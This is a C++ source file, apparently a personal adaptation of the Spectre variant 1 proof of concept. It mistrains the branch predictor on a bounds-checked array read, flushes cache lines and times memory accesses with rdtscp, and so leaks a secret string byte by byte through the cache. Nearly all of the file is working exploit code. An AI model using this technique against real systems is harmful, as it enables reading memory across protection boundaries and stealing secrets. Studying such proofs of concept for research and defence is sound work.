#include <emmintrin.h>
#include <fmt/core.h>
#include <fmt/format.h>
#include <stdint.h>
#include <string>
#include <x86intrin.h> /* for rdtscp and clflush */
#include <numeric>

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
// uint8_t array2[256 * 512];

const char *secret = "Minecraft ONE LOVE";

static void force_read(uint8_t *p) {
  asm volatile(""
               :
               : "r"(*p)
               : "memory");
}

static int64_t read_tsc() {
  unsigned int junk;
  return __rdtscp(&junk);
}

static std::pair<int, int> top_two_scores(const auto &range) {
  int j = 0;
  int k = 0;
  for (int i = 0; i < range.size(); i++) {
    if (range[i] >= range[j]) {
      k = j;
      j = i;
    } else if (range[i] >= range[k]) {
      k = i;
    }
  }
  return {j, k};
}

// void victim_function(size_t x) {
//   if (x < array1_size) {
//     force_read(&array2[array1[x] * 512]);
//   }
// }

/********************************************************************
Analysis code
********************************************************************/
constexpr auto CACHE_HIT_THRESHOLD = 80; /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, int32_t value[2], int32_t score[2]) {
  static uint8_t timing_array[256 * 512];
  memset(timing_array, 1, sizeof(timing_array));

  auto scores = std::array<int, 256>{};
  auto latencies = std::array<int64_t, 256>{};

  int best = 0;
  int second_best = 0;
  size_t training_x, x;

  for (int tries = 1000; tries > 0; tries--) {
    /* Flush timing_array[256*(0..255)] from cache */
    for (int i = 0; i < 256; i++)
      _mm_clflush(&timing_array[i * 512]); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (int j = 256; j >= 0; j--) {
      _mm_clflush(&array1_size);
      for (volatile int z = 0; z < 100; z++) {
      } /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      if (x < array1_size) {
        force_read(&timing_array[array1[x] * 512]);
      }
    }

    unsigned int junk = 0;

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (int i = 0; i < 256; ++i) {
      int mixed_i = ((i * 167) + 13) & 0xFF;
      uint8_t *timing_addr = &timing_array[mixed_i * 512];
      int64_t start = read_tsc(); /* READ TIMER */
      force_read(timing_addr); /* MEMORY ACCESS TO TIME */
      latencies[mixed_i] = read_tsc() - start;
    }

    int64_t avg_latency = std::accumulate(latencies.begin(), latencies.end(), 0) / latencies.size();

    for (int i = 0; i < 256; ++i) {
      if (latencies[i] < (avg_latency * 3 / 4)) {
        ++scores[i];
      }
    }

    /* Locate highest & second-highest results results tallies in j/k */
    std::tie(best, second_best) = top_two_scores(scores);

    if (scores[best] > (2 * scores[second_best] + 400)) {
      break;
    }
  }
  // results[0] ^= junk; /* use junk so code above won't get optimized out*/
  value[0] = best;
  score[0] = scores[best];
  value[1] = second_best;
  score[1] = scores[second_best];
}

int main(int argc, const char **argv) {
  fmt::print("Putting '{}' in memory, address {}\n", secret, (void *)secret);
  auto malicious_x = static_cast<size_t>(secret - (char *)array1); /* default for malicious_x */

  fmt::print("secret = {}\n", (void *)secret);
  fmt::print("array1 = {}\n", (void *)array1);
  fmt::print("malicious_x = {}\n", (void *)malicious_x);

  int32_t score[2];
  int32_t value[2];

  for (int i = strlen(secret); i > 0; --i) {
    // printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    readMemoryByte(malicious_x++, value, score);
    // fmt::print("{}", (char)value[0]);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X='%c' score=%d)", value[1],
             (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
             score[1]);
    printf("\n");
  }

  return 0;
}
